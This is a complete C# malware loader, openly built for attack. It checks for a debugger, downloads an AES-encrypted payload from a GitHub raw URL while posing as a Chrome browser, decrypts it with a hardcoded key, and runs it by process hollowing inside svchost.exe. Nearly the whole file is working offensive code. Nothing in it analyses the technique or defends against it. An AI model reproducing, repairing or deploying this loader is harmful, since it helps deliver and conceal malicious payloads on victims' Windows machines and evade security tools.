using System;
using System.IO;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Threading.Tasks;

// The main Program class for the Loader.
// There should be no other classes with a Main method in this project.
public class Program
{
    static async Task Main(string[] args)
    {
        // --- STAGE 1: STAGER SURVIVAL (ANTI-ANALYSIS) ---
        if (Native.IsDebuggerPresent()) return;
        Thread.Sleep(3000);

        // --- STAGE 2: FETCH & DECRYPT PAYLOAD ---
        string payloadUrl = "https://github.com/lucid251/HGJFJTKH24/raw/refs/heads/main/vi2_tiny.enc";
        byte[] payload;

        try
        {
            using HttpClient client = new HttpClient();
            client.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36");
            byte[] encryptedPayload = await client.GetByteArrayAsync(payloadUrl);

            // This key and IV MUST EXACTLY MATCH the ones in your separate Encryptor utility.
            byte[] key = { 0x11, 0x22, 0x33, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x30, 0x31, 0x32 };
            byte[] iv = { 0xDE, 0xAD, 0xBE, 0xEF, 0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x13, 0x37, 0xAB, 0xCD, 0xDC, 0xBA, 0x01 };

            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;
                ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV);
                payload = decryptor.TransformFinalBlock(encryptedPayload, 0, encryptedPayload.Length);
            }
        }
        catch { return; }

        // --- STAGE 3: EXECUTE VIA PROCESS HOLLOWING ---
        string decoyPath = "C:\\Windows\\System32\\svchost.exe";
        HollowAndExecute(decoyPath, payload);
    }

    static unsafe bool HollowAndExecute(string decoyPath, byte[] payload)
    {
        var startupInfo = new Native.STARTUPINFO();
        startupInfo.cb = (uint)Marshal.SizeOf(startupInfo);
        var processInfo = new Native.PROCESS_INFORMATION();

        try
        {
            bool success = Native.CreateProcess(null, decoyPath, IntPtr.Zero, IntPtr.Zero, false, Native.CREATE_SUSPENDED, IntPtr.Zero, null, ref startupInfo, out processInfo);
            if (!success) return false;

            var context = new Native.CONTEXT_64();
            context.ContextFlags = Native.CONTEXT_AMD64_FULL;
            if (!Native.GetThreadContext(processInfo.hThread, ref context)) return false;

            IntPtr imageBase;
            if (!Native.ReadProcessMemory(processInfo.hProcess, (IntPtr)(context.Rdx + 16), out imageBase, (IntPtr)8, out _)) return false;

            var payloadHandle = GCHandle.Alloc(payload, GCHandleType.Pinned);
            IntPtr payloadBase = payloadHandle.AddrOfPinnedObject();
            int e_lfanew = Marshal.ReadInt32(payloadBase, 0x3C);
            IntPtr ntHeaders = payloadBase + e_lfanew;
            uint sizeOfImage = (uint)Marshal.ReadInt32(ntHeaders + 0x50);
            IntPtr addressOfEntryPoint = (IntPtr)Marshal.ReadInt32(ntHeaders + 0x28);

            Native.NtUnmapViewOfSection(processInfo.hProcess, imageBase);
            IntPtr newImageBase = Native.VirtualAllocEx(processInfo.hProcess, imageBase, (IntPtr)sizeOfImage, Native.MEM_COMMIT | Native.MEM_RESERVE, Native.PAGE_EXECUTE_READWRITE);
            if (newImageBase == IntPtr.Zero) return false;

            IntPtr headersSize = (IntPtr)Marshal.ReadInt32(ntHeaders + 0x54);
            if (!Native.WriteProcessMemory(processInfo.hProcess, newImageBase, payloadBase, (uint)headersSize, out _)) return false;

            int sectionOffset = e_lfanew + 0x108;
            short numberOfSections = Marshal.ReadInt16(ntHeaders + 0x06);

            for (short i = 0; i < numberOfSections; i++)
            {
                IntPtr sectionHeader = ntHeaders + sectionOffset + (i * 0x28);
                uint virtualAddress = (uint)Marshal.ReadInt32(sectionHeader + 0x0C);
                uint sizeOfRawData = (uint)Marshal.ReadInt32(sectionHeader + 0x10);
                uint pointerToRawData = (uint)Marshal.ReadInt32(sectionHeader + 0x14);
                if (sizeOfRawData > 0)
                {
                    if (!Native.WriteProcessMemory(processInfo.hProcess, newImageBase + (int)virtualAddress, payloadBase + (int)pointerToRawData, sizeOfRawData, out _)) return false;
                }
            }

            // --- THIS IS THE FIX for the CS1615 and CS1503 errors ---
            // We are writing the value of our new base address into the target process's PEB.
            // We pass a pointer to our 'newImageBase' variable as the buffer.
            if (!Native.WriteProcessMemory(processInfo.hProcess, (IntPtr)(context.Rdx + 16), (IntPtr)(&newImageBase), (uint)sizeof(IntPtr), out _)) return false;
            // ----------------------------------------------------------------

            context.Rcx = (ulong)newImageBase + (ulong)addressOfEntryPoint;
            if (!Native.SetThreadContext(processInfo.hThread, ref context)) return false;

            if (Native.ResumeThread(processInfo.hThread) == -1) return false;

            payloadHandle.Free();
            return true;
        }
        finally
        {
            Native.CloseHandle(processInfo.hThread);
            Native.CloseHandle(processInfo.hProcess);
        }
    }
}

// This Native class contains all the Windows API definitions. It should be part of the same file.
public static unsafe class Native
{
    public const uint CREATE_SUSPENDED = 0x00000004;
    public const uint MEM_COMMIT = 0x1000;
    public const uint MEM_RESERVE = 0x2000;
    public const uint PAGE_EXECUTE_READWRITE = 0x40;
    public const uint CONTEXT_AMD64_FULL = 0x10000B;

    [DllImport("kernel32.dll")] public static extern bool IsDebuggerPresent();
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)] public static extern bool CreateProcess(string? lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string? lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
    [DllImport("kernel32.dll", SetLastError = true)] public static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT_64 lpContext);
    [DllImport("kernel32.dll", SetLastError = true)] public static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT_64 lpContext);
    [DllImport("kernel32.dll", SetLastError = true)] public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, out IntPtr lpBuffer, IntPtr nSize, out IntPtr lpNumberOfBytesRead);
    [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll", SetLastError = true)] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll", SetLastError = true)] public static extern int ResumeThread(IntPtr hThread);
    [DllImport("kernel32.dll", SetLastError = true)] public static extern bool CloseHandle(IntPtr hObject);
    [DllImport("ntdll.dll", SetLastError = true)] public static extern uint NtUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);

    [StructLayout(LayoutKind.Sequential)] public struct PROCESS_INFORMATION { public IntPtr hProcess; public IntPtr hThread; public int dwProcessId; public int dwThreadId; }
    [StructLayout(LayoutKind.Sequential)] public struct STARTUPINFO { public uint cb; public string lpReserved; public string lpDesktop; public string lpTitle; public uint dwX; public uint dwY; public uint dwXSize; public uint dwYSize; public uint dwXCountChars; public uint dwYCountChars; public uint dwFillAttribute; public uint dwFlags; public ushort wShowWindow; public ushort cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; }
    [StructLayout(LayoutKind.Sequential, Pack = 16)] public struct CONTEXT_64 { public ulong P1Home; public ulong P2Home; public ulong P3Home; public ulong P4Home; public ulong P5Home; public ulong P6Home; public uint ContextFlags; public uint MxCsr; public ushort SegCs; public ushort SegDs; public ushort SegEs; public ushort SegFs; public ushort SegGs; public ushort SegSs; public uint EFlags; public ulong Dr0; public ulong Dr1; public ulong Dr2; public ulong Dr3; public ulong Dr6; public ulong Dr7; public ulong Rax; public ulong Rcx; public ulong Rdx; public ulong Rbx; public ulong Rsp; public ulong Rbp; public ulong Rsi; public ulong Rdi; public ulong R8; public ulong R9; public ulong R10; public ulong R11; public ulong R12; public ulong R13; public ulong R14; public ulong R15; public ulong Rip; public FLOATING_SAVE_AREA FltSave; public M128A[] VectorRegister; public ulong VectorControl; public ulong DebugControl; public ulong LastBranchToRip; public ulong LastBranchFromRip; public ulong LastExceptionToRip; public ulong LastExceptionFromRip; }
    [StructLayout(LayoutKind.Sequential, Pack = 16)] public struct FLOATING_SAVE_AREA { public ushort ControlWord; public ushort StatusWord; public byte TagWord; public byte Reserved1; public ushort ErrorOpcode; public uint ErrorOffset; public ushort ErrorSelector; public ushort Reserved2; public uint DataOffset; public ushort DataSelector; public ushort Reserved3; [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)] public byte[] RegisterArea; public uint Cr0NpxState; }
    [StructLayout(LayoutKind.Sequential, Pack = 16)] public struct M128A { public ulong High; public long Low; }
}
